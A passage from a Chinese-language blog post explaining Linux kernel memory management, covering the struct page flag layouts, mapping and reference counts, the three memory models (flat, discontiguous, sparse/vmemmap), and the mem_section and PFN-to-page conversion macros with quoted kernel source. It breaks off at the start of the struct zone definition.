页面，则可能是被文件系统使用</li><li><code>PG_arch_1</code>：该标志位与体系结构相关联</li><li><code>PG_reserved</code>：该页被保留，不能够被 swap out（内核会将不活跃的页交换到磁盘上）</li><li><code>PG_private</code> &amp;&amp; <code>PG_private2</code>：该页拥有私有数据（private 字段）</li><li><code>PG_writeback</code>：该页正在被写到磁盘上</li><li><code>PG_head</code>：在内核中有时需要将多个页组成一个 compound pages，而设置该状态时表明该页是 compound pages 的第一个页</li><li><code>PG_mappedtodisk</code>：该页被映射到硬盘中</li><li><code>PG_reclaim</code>：该页可以被回收</li><li><code>PG_swapbacked</code>：该页的后备存储器为 swap&#x2F;RAM</li><li><code>PG_unevictable</code>：该页不可被回收（被锁），且会出现在 <code>LRU_UNEVICTABLE</code> 链表中</li><li><code>PG_mlocked</code>：该页被对应的 vma 上锁（通常是系统调用 mlock）</li><li><code>PG_uncached</code>：该页被设置为不可缓存</li><li><code>PG_hwpoison</code>：硬件相关的标志位</li><li><code>PG_young</code>：</li><li><code>PG_idle</code>：</li><li><code>PG_arch_2</code>：64位下的体系结构相关标志位</li></ul><h4 id="flags-内存复用"><a href="#flags-内存复用" class="headerlink" title="flags 内存复用"></a>flags 内存复用</h4><p>为了节省空间，flags 字段除了用作标志位外还给其他结构使用，其划分的形式其实与内核配置的内存模型有关，在 <code>include\linux\page-flags-layout.h</code>  文件中描述了五种划分形式（其实是三大种）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * page-&gt;flags layout:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * There are five possibilities for how page-&gt;flags get laid out.  The first</span><br><span class="hljs-comment"> * pair is for the normal case without sparsemem. The second pair is for</span><br><span class="hljs-comment"> * sparsemem when there is plenty of space for node and section information.</span><br><span class="hljs-comment"> * The last is when there is insufficient space in page-&gt;flags and a separate</span><br><span class="hljs-comment"> * lookup is necessary.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * No sparsemem or sparsemem vmemmap: |       NODE     | ZONE |             ... | FLAGS |</span><br><span class="hljs-comment"> *      &quot; plus space for last_cpupid: |       NODE     | ZONE | LAST_CPUPID ... | FLAGS |</span><br><span class="hljs-comment"> * classic sparse with space for node:| SECTION | NODE | ZONE |             ... | FLAGS |</span><br><span class="hljs-comment"> *      &quot; plus space for last_cpupid: | SECTION | NODE | ZONE | LAST_CPUPID ... | FLAGS |</span><br><span class="hljs-comment"> * classic sparse no space for node:  | SECTION |     ZONE    | ... | FLAGS |</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h5 id="非-sparse-内存模式-x2F-sparse-vmemmap-内存模式"><a href="#非-sparse-内存模式-x2F-sparse-vmemmap-内存模式" class="headerlink" title="非 sparse 内存模式 &#x2F; sparse vmemmap 内存模式"></a>非 sparse 内存模式 &#x2F; sparse vmemmap 内存模式</h5><p>如下图所示，低位用作该 page 的 flag，高位分别标识其归属的 zone， node id（非 NUMA 系统中为0），中间剩余的位保留</p><p><img src="https://i.loli.net/2021/11/25/8J9pm3n1eZuTKi6.png" alt="image.png"></p><p>这种形式中若是开启了 <code>last_cpuid</code> 则是下面这个样子：</p><p><img src="https://i.loli.net/2021/11/25/xhNpH3vkmli8EXt.png" alt="image.png"></p><h5 id="sparse-内存模式"><a href="#sparse-内存模式" class="headerlink" title="sparse 内存模式"></a>sparse 内存模式</h5><p>如下图所示，相比起第一种形式多了一个 SECTION 字段标识其归属的 <code>mem_section</code></p><p><img src="https://i.loli.net/2021/11/25/CETbQSKwV8er5OR.png" alt="image.png"></p><p>若是开启了 <code>last_cpuid</code> 则是下面这个样子</p><p><img src="https://i.loli.net/2021/11/25/KDSHvF4LjOXpIcE.png" alt="image.png"></p><h5 id="没有-Node-的-sparse-内存模式"><a href="#没有-Node-的-sparse-内存模式" class="headerlink" title="没有 Node 的 sparse 内存模式"></a>没有 Node 的 sparse 内存模式</h5><p>主要是针对非 NUMA 设计的，在这种模式下取消了 Node 结构</p><p><img src="https://i.loli.net/2021/11/25/QiJChHBdvARktOs.png" alt="image.png"></p><h3 id="mapcount：映射计数"><a href="#mapcount：映射计数" class="headerlink" title="_mapcount：映射计数"></a>_mapcount：映射计数</h3><p>记录该页被页表映射的次数，每个进程有其独立的页表，故可以理解为该值记录了该页被多少个进程共享，其初始值为 -1</p><p>由于这是一个联合体，若是该页既不是 PageSlab 也没有被映射到用户空间，则为 page_type 字段，具体说明定义于 <code>/include/linux/page-flags.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * For pages that are never mapped to userspace (and aren&#x27;t PageSlab),</span><br><span class="hljs-comment"> * page_type may be used.  Because it is initialised to -1, we invert the</span><br><span class="hljs-comment"> * sense of the bit, so __SetPageFoo *clears* the bit used for PageFoo, and</span><br><span class="hljs-comment"> * __ClearPageFoo *sets* the bit used for PageFoo.  We reserve a few high and</span><br><span class="hljs-comment"> * low bits so that an underflow or overflow of page_mapcount() won&#x27;t be</span><br><span class="hljs-comment"> * mistaken for a page type value.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_TYPE_BASE    0xf0000000</span><br><span class="hljs-comment">/* Reserve        0x0000007f to catch underflows of page_mapcount */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_MAPCOUNT_RESERVE    -128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PG_buddy    0x00000080</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PG_offline    0x00000100</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PG_table    0x00000200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PG_guard    0x00000400</span><br></code></pre></td></tr></table></figure><h3 id="refcount：引用计数"><a href="#refcount：引用计数" class="headerlink" title="_refcount：引用计数"></a>_refcount：引用计数</h3><p>该字段用作该页面<strong>在内核中</strong>的引用计数器，初始时页面为空闲状态，该计数器为 0，每当该页面被分配引用时计数器会 + 1，被其他页面进行引用时也会 + 1</p><p>当引用计数器为 0 时表示该页面为空闲状态或即将要被释放，若大于 0 则表示正在被使用，暂时不会释放</p><p>内核中提供了两个函数 <code>get_page()</code>与 <code>put_page()</code> 来进行引用计数的增减，后者在引用计数器为 1 时会调用 <code>__put_single_page()</code> 释放该页面（1-&gt;0，该页面已空闲）</p><h3 id="virtual：虚拟地址"><a href="#virtual：虚拟地址" class="headerlink" title="**virtual：虚拟地址**"></a>**virtual：虚拟地址**</h3><p>该字段为该物理页框对应的的<strong>虚拟地址</strong>，那么这里又要放上这张经典的图：</p><p><img src="https://i.loli.net/2021/11/23/q6jTAJkU9XuCHWV.png" alt="image.png"></p><p>每一个 struct page 对应一个物理页框，那么这个 virtual 字段其实就是<strong>上图的反向映射</strong></p><h2 id="II-不同内存模型下的-struct-page-存储方式"><a href="#II-不同内存模型下的-struct-page-存储方式" class="headerlink" title="II.不同内存模型下的 struct page 存储方式"></a>II.不同内存模型下的 struct page 存储方式</h2><p>Linux 提供了三种内存模型，定义于 <code>include/asm-generic/memory_model.h</code> 中，如下图所示（偷的图，侵删）：</p><p><img src="https://i.loli.net/2021/11/25/wLzFuCB5n1DAIY7.png" alt="image.png"></p><p>内存模型在编译期就会被确定下来，目前常用的是 <code>Sparse Memory</code> 模型，即离散内存模型</p><h3 id="Flat-Memory"><a href="#Flat-Memory" class="headerlink" title="Flat Memory"></a>Flat Memory</h3><p>平滑内存模型。物理内存地址连续，有一个<strong>全局变量</strong> <code>mem_map</code> ——由一个大的 struct page 数组直接对应现有的物理内存</p><h3 id="Discontiguous-Memory"><a href="#Discontiguous-Memory" class="headerlink" title="Discontiguous Memory"></a>Discontiguous Memory</h3><p>非连续性内存模型。主要针对内存中存在空洞的情况。</p><p>对于每一段连续的物理内存，都有一个 <code>pglist_data</code> 结构体进行对应，其成员 <code>node_mem_map</code> 为一个 struct page 指针，指向一个 page 结构体数组，由该结构体对应到该段连续物理内存</p><p>有一个<strong>全局变量</strong> <code>node_data</code> 为一个 pglist_data 指针数组，其中存放着指向每一个 pglist_data 的指针，该数组的大小为 <code>MAX_NUMNODES</code></p><h3 id="Sparse-Memory"><a href="#Sparse-Memory" class="headerlink" title="Sparse Memory"></a>Sparse Memory</h3><p>离散内存模型。在一个 mem_section 结构体中存在一个 <code>section_mem_map</code> 成员指向一个 struct page 数组对应一段连续的物理内存，即将内存按照 section 为单位进行分段</p><p>存在一个全局指针数组 <code>mem_section</code> （与结构体同名）存放所有的 <code>mem_section</code> 指针，指向<strong>理论上支持的内存空间</strong>，每个 section 对应的物理内存不一定存在，若不存在则此时该 section 的指针为 NULL</p><p>这种模型<strong>支持内存的热拔插</strong></p><blockquote><p>图还是偷的，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/RN47OEoaM31xQhA.png" alt="image.png"></p><h4 id="mem-section-结构体"><a href="#mem-section-结构体" class="headerlink" title="mem_section 结构体"></a>mem_section 结构体</h4><p>该结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> &#123;</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 逻辑上这指向一个 pages 结构体数组，</span><br><span class="hljs-comment">     * 然而，他的存储还有一些别的魔力</span><br><span class="hljs-comment">     * (参见 sparse.c::sparse_init_one_section())</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 此外，在引导的早期，我们对此处节区的位置的</span><br><span class="hljs-comment">     * 节点的id进行编码，以指引分配。</span><br><span class="hljs-comment">     * (参见 sparse.c::memory_present())</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * 将之声明为一个 unsigned long，至少可以让人在</span><br><span class="hljs-comment">     * 错误使用之前完成一次（类型）转换</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> section_mem_map;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section_usage</span> *<span class="hljs-title">usage</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 若是 SPARSEMEM, pgdat 没有 page_ext 指针.</span><br><span class="hljs-comment">     * 我们使用 section. (关于这个，参见 page_ext.h)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page_ext</span> *<span class="hljs-title">page_ext</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pad;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 警告: mem_section 的大小必须是2的幂次方， 以便于</span><br><span class="hljs-comment">     * 让计算与使用 SECTION_ROOT_MASK 有意义</span><br><span class="hljs-comment">     */</span><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="CONFIG-SPARSEMEM-EXTREME-：动态分配-mem-section-数组"><a href="#CONFIG-SPARSEMEM-EXTREME-：动态分配-mem-section-数组" class="headerlink" title="_CONFIG_SPARSEMEM_EXTREME_：动态分配 mem_section 数组"></a>_CONFIG_SPARSEMEM_EXTREME_：动态分配 <code>mem_section</code> 数组</h4><p>内核编译选项之一，若开启了则连 <code>mem_section</code> 数组的空间也是动态分配的，在 section 较多的情况下通常会开启这个编译选项</p><h4 id="全局-mem-section-数组"><a href="#全局-mem-section-数组" class="headerlink" title="全局 mem_section 数组"></a>全局 mem_section 数组</h4><p>该数组中存放着指向所有 mem_section 结构体的指针，定义于 <code>/mm/sparse.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> **<span class="hljs-title">mem_section</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> <span class="hljs-title">mem_section</span>[<span class="hljs-title">NR_SECTION_ROOTS</span>][<span class="hljs-title">SECTIONS_PER_ROOT</span>]</span><br><span class="hljs-class">    ____<span class="hljs-title">cacheline_internodealigned_in_smp</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>若未开启 <em>CONFIG_SPARSEMEM_EXTREME</em> 编译选项则 mem_section 为一个常规的<strong>二维数组</strong>，否则为一个<strong>二级指针</strong>，其所指向空间内存动态分配</p><p>对于后一种情况，其结构如下图所示：</p><p><img src="https://i.loli.net/2021/12/03/wVpetDxj5gRlfWN.png" alt="自己画的图.png"></p><h4 id="PFN-与-page-结构体间的转换"><a href="#PFN-与-page-结构体间的转换" class="headerlink" title="PFN 与 page 结构体间的转换"></a>PFN 与 page 结构体间的转换</h4><p>kernel 中提供了两个用以在 PFN（Page Frame Numer） 与 page 结构体之间进行转换的宏，定义于 <code>/include/asm-generic/memory_model.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SPARSEMEM)</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Note: 节区的 mem_map 被编码以表示其 start_pfn.</span><br><span class="hljs-comment"> * section[i].section_mem_map == mem_map&#x27;s address - start_pfn;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __page_to_pfn(pg)                    \</span><br><span class="hljs-meta">(&#123;    const struct page *__pg = (pg);                \</span><br><span class="hljs-meta">    int __sec = page_to_section(__pg);            \</span><br><span class="hljs-meta">    (unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));    \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pfn_to_page(pfn)                \</span><br><span class="hljs-meta">(&#123;    unsigned long __pfn = (pfn);            \</span><br><span class="hljs-meta">    struct mem_section *__sec = __pfn_to_section(__pfn);    \</span><br><span class="hljs-meta">    __section_mem_map_addr(__sec) + __pfn;        \</span><br><span class="hljs-meta">&#125;)</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* CONFIG_FLATMEM/DISCONTIGMEM/SPARSEMEM */</span></span><br></code></pre></td></tr></table></figure><p>在这里我们需要注意一点：<strong>mem_section 结构体的 section_mem_map 中存储的为 page 数组与 PFN 的差值</strong></p><h5 id="（1）page-结构体到-PFN：page-结构体地址减去对应-mem-section-gt-section-mem-map"><a href="#（1）page-结构体到-PFN：page-结构体地址减去对应-mem-section-gt-section-mem-map" class="headerlink" title="（1）page 结构体到 PFN：page 结构体地址减去对应 mem_section-&gt;section_mem_map"></a>（1）page 结构体到 PFN：page 结构体地址减去对应 mem_section-&gt;section_mem_map</h5><p>该宏首先会使用 <code>page_to_section()</code> <strong>通过 page 结构体的 flags 字段</strong>获取该 page 所属的 section 标号，该函数定义于 <code>/include/linux/mm.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">page_to_section</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> page *page)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> (page-&gt;flags &gt;&gt; SECTIONS_PGSHIFT) &amp; SECTIONS_MASK;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后使用 <code>__nr_to_section()</code> 来获取对应的 mem_section 结构体的地址，该函数定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> *__<span class="hljs-title">nr_to_section</span>(<span class="hljs-title">unsigned</span> <span class="hljs-title">long</span> <span class="hljs-title">nr</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span><br>    <span class="hljs-keyword">if</span> (!mem_section)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">if</span> (!mem_section[SECTION_NR_TO_ROOT(nr)])<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> &amp;mem_section[SECTION_NR_TO_ROOT(nr)][nr &amp; SECTION_ROOT_MASK];<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用到一个宏 <code>SEECTION_NR_TO_ROOT</code>，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECTIONS_PER_ROOT       (PAGE_SIZE / sizeof (struct mem_section))</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECTIONS_PER_ROOT    1</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECTION_NR_TO_ROOT(sec)    ((sec) / SECTIONS_PER_ROOT)</span><br></code></pre></td></tr></table></figure><p>我们默认开启 <code>CONFIG_SPARSEMEM_EXTREME</code>，此时 <code>SECTION_PER_ROOT</code> 意为一张页中 mem_section 结构体的数量，即宏 <code>SEECTION_NR_TO_ROOT</code> 得到的是对应的_页下标_，之后再通过 mem_section 标号与每页中 mem_section 数量 - 1（<code>SECTION_ROOT_MASK</code>）做与运算最终得到该 mem_section 在该页这一 mem_section 数组中的下标</p><p>之后通过 <code>__section_mem_map_addr()</code> 获取到 mem_section 结构体中的 section_mem_map 成员，该函数定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *__<span class="hljs-title">section_mem_map_addr</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> *<span class="hljs-title">section</span>)</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-built_in">map</span> = section-&gt;section_mem_map;<br>    <span class="hljs-built_in">map</span> &amp;= SECTION_MAP_MASK;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">struct</span> page *)<span class="hljs-built_in">map</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后与 page 结构体的地址做差运算便能获得其 PFN，需要注意的是在这里进行的是 <em>page 结构体指针间的运算</em> 而非简单的地址加减法，计算过程为：<br>$$<br>address_{struct\ page} - section_mem_map &#x3D; address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>&#x3D;(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>&#x3D;PFN<br>$$</p><h5 id="（2）PFN-到-page-结构体：页框号加上对应-mem-section-gt-section-mem-map"><a href="#（2）PFN-到-page-结构体：页框号加上对应-mem-section-gt-section-mem-map" class="headerlink" title="（2）PFN 到 page 结构体：页框号加上对应 mem_section-&gt;section_mem_map"></a>（2）PFN 到 page 结构体：页框号加上对应 mem_section-&gt;section_mem_map</h5><p>该宏首先使用 <code>__pfn_section()</code> 来获取到 PFN 所属的 mem_section，该函数定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mem_section</span> *__<span class="hljs-title">pfn_to_section</span>(<span class="hljs-title">unsigned</span> <span class="hljs-title">long</span> <span class="hljs-title">pfn</span>)</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">return</span> __nr_to_section(pfn_to_section_nr(pfn));<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 <code>pfn_to_section_nr()</code> 定义如下，用以获取对应的 section 的索引：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pfn_to_section_nr</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pfn)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> pfn &gt;&gt; PFN_SECTION_SHIFT;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用到一个宏 <code>PFN_SECTION_SHIFT</code>，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_SECTION_SHIFT    (SECTION_SIZE_BITS - PAGE_SHIFT)</span><br></code></pre></td></tr></table></figure><p>其中的 <code>SECTION_SIZE_BIT</code> 表示一个 section 的大小（恒定为2的幂次方）所占位数，而 <code>PAGE_SHIFT</code> 则为一个页的大小（通常为4096）所占位数，前者移位后者所得为_一个 section 中页的数量_</p><p>由页框号移位（本质为除法）单个 section 中页的数量便能得到其所属 section 标号</p><p>之后使用 <code>__nr_to_section()</code> 来获取对应的 mem_section 结构体的地址，最后使用 <code>__section_mem_map_addr()</code> 获取到 mem_section 结构体中的 section_mem_map 成员后再与页框号做 <em>指针加法</em> 便能获取到对应的 page 结构体数组，计算过程如下：<br>$$<br>PFN - section_mem_map &#x3D; PFN - (address_{mem_map} - start_PFN)\<br>&#x3D; (PFN - start_PFN )+ address_{mem_map}<br>\<br>&#x3D;address_{struct\ page}<br>$$</p><h4 id="Sparse-Memory-virtual-memmap"><a href="#Sparse-Memory-virtual-memmap" class="headerlink" title="*Sparse Memory virtual memmap"></a><em>*Sparse Memory virtual memmap</em></h4><p>基于Sparse Memory 内存模型上引入了 vmemmap 的概念，是目前 Linux 最常用的内存模型之一</p><blockquote><p>图依然是偷的，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/mnAUkENCoRwjtpq.png" alt="image.png"></p><p>在开启了 vmemmap 之后，所有的 mem_section 中的 page 都抽象到一个虚拟数组 vmemmap 中，这样在进行struct page * 和 pfn 转换时，直接使用 vmemmap 数组即可</p><h1 id="0x02-struct-zone：区"><a href="#0x02-struct-zone：区" class="headerlink" title="0x02.struct zone：区"></a>0x02.struct zone：区</h1><p>在 Linux 下将一个节点内不同用途的内存区域划分为不同的 <code>区（zone）</code>，对应结构体 <code>struct zone</code>，该结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">/* Read-mostly 